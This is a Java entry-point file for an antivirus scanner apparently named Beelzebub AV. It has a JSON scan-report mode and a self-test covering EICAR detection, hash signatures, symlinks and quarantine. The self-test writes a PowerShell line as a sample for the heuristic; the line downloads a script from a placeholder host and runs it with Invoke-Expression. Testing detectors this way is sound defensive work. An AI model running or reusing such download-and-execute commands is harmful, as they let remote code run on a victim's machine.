package ai.duckos.beelzebub;

import java.nio.file.*;
import java.security.MessageDigest;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;

public final class Main {
    private Main() {}
    public static void main(String[] args) throws Exception {
        if (args.length > 0 && args[0].equals("--self-test")) { selfTest(); return; }
        if (args.length > 1 && args[0].equals("--scan")) {
            ScanResult result = new ScannerEngine(new SignatureCatalog()).scan(Path.of(args[1]), new AtomicBoolean(), null);
            System.out.println(json(result));
            if (result.threatsFound() > 0) System.exit(1);
            return;
        }
        BeelzebubAV.open();
    }
    private static String escape(String value) {
        StringBuilder out = new StringBuilder(value.length() + 16);
        for (int index = 0; index < value.length(); index++) {
            char ch = value.charAt(index);
            switch (ch) {
                case '\\' -> out.append("\\\\");
                case '"' -> out.append("\\\"");
                case '\b' -> out.append("\\b");
                case '\f' -> out.append("\\f");
                case '\n' -> out.append("\\n");
                case '\r' -> out.append("\\r");
                case '\t' -> out.append("\\t");
                default -> {
                    if (ch < 0x20) out.append(String.format(Locale.ROOT, "\\u%04x", (int) ch));
                    else out.append(ch);
                }
            }
        }
        return out.toString();
    }
    private static String json(ScanResult r) {
        StringBuilder out = new StringBuilder("{\"schema\":\"beelzebub.scan-report.v1\",\"target\":\"")
                .append(escape(r.target().toString())).append("\",\"files_scanned\":").append(r.filesScanned())
                .append(",\"bytes_scanned\":").append(r.bytesScanned()).append(",\"skipped\":").append(r.skipped())
                .append(",\"failures\":").append(r.failures()).append(",\"cancelled\":").append(r.cancelled())
                .append(",\"duration_ms\":").append(r.duration().toMillis()).append(",\"findings\":[");
        for (int i=0;i<r.findings().size();i++) {
            var f=r.findings().get(i); if(i>0) out.append(',');
            out.append("{\"path\":\"").append(escape(f.path().toString())).append("\",\"sha256\":\"").append(f.sha256())
                    .append("\",\"name\":\"").append(escape(f.name())).append("\",\"severity\":\"").append(f.severity())
                    .append("\",\"reason\":\"").append(escape(f.reason())).append("\",\"size\":").append(f.size()).append('}');
        }
        return out.append("]}").toString();
    }
    private static void selfTest() throws Exception {
        Path temp = Files.createTempDirectory("beelzebub-self-test-");
        String previousData = System.getProperty("duckos.beelzebub.data");
        System.setProperty("duckos.beelzebub.data", temp.resolve("data").toString());
        try {
            String eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
            Path test = temp.resolve("eicar.com"); Files.writeString(test, "x".repeat(65536) + eicar);
            ScannerEngine engine = new ScannerEngine(new SignatureCatalog());
            var finding = engine.scanFile(test);
            if (finding == null || !finding.name().equals("EICAR test file")) throw new AssertionError("EICAR detector failed");
            Path script = temp.resolve("dropper.ps1");
            Files.writeString(script, "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://invalid.local/x'); [Convert]::FromBase64String('AA==')");
            var heuristic = engine.scanFile(script);
            if (heuristic == null || !heuristic.severity().equals("SUSPICIOUS")) throw new AssertionError("Script heuristic failed");
            Path known = temp.resolve("known.bin"); Files.writeString(known, "known-indicator-payload");
            String hash = HexFormat.of().formatHex(MessageDigest.getInstance("SHA-256").digest(Files.readAllBytes(known)));
            Path feed = temp.resolve("feed.txt"); Files.writeString(feed, hash + "|HIGH|Self-test indicator\n");
            SignatureCatalog imported = new SignatureCatalog(); imported.importFile(feed);
            if (!new ScannerEngine(imported).scanFile(known).name().equals("Self-test indicator")) throw new AssertionError("Signature import failed");
            try { Files.createSymbolicLink(temp.resolve("link"), test); if (engine.scanFile(temp.resolve("link")) != null) throw new AssertionError("Symlink was scanned"); }
            catch (UnsupportedOperationException | FileSystemException ignored) {}
            Path original = temp.resolve("restore-me.txt"); Files.writeString(original, "quarantine-test");
            QuarantineService service = new QuarantineService(); var entry = service.quarantine(original);
            if (Files.exists(original)) throw new AssertionError("Quarantine did not move file");
            if (!Files.readString(service.restore(entry.id())).equals("quarantine-test")) throw new AssertionError("Restore failed");
            Path collision = temp.resolve("collision.txt"); Files.writeString(collision, "original");
            var collisionEntry = service.quarantine(collision); Files.writeString(collision, "do-not-overwrite");
            try { service.restore(collisionEntry.id()); throw new AssertionError("Restore overwrote existing file"); }
            catch (java.io.IOException expected) {}
            System.out.println("Beelzebub AV self-test: PASS (EICAR, SHA-256, script heuristics, symlink policy, quarantine, restore collision)");
        } finally {
            if (previousData == null) System.clearProperty("duckos.beelzebub.data");
            else System.setProperty("duckos.beelzebub.data", previousData);
            try (var paths = Files.walk(temp)) {
                paths.sorted(Comparator.reverseOrder()).forEach(p -> { try { Files.deleteIfExists(p); } catch (Exception ignored) {} });
            }
        }
    }
}
